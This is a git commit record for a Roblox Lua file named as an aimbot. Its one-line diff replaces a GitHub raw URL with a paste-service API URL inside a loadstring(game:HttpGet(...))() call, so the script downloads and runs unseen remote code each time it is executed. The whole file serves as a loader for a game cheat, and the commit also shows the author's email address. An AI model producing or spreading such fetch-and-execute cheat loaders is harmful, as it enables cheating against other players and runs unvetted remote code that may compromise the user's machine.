7d89cf18754b71e012a45c892e15e2fc3232ea39
UncleEddie471 <matthewlopena200@gmail.com>
2026-09-20 09:58:17 +0800

    Update EddiesHub_aimbot.lua

--- EddiesHub_aimbot.lua
+++ EddiesHub_aimbot.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ExodusHubScript/UniversalLoader/refs/heads/main/EddiesHub.lua"))()
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/R0Yp5t7qYTMZuCHO/raw"))()
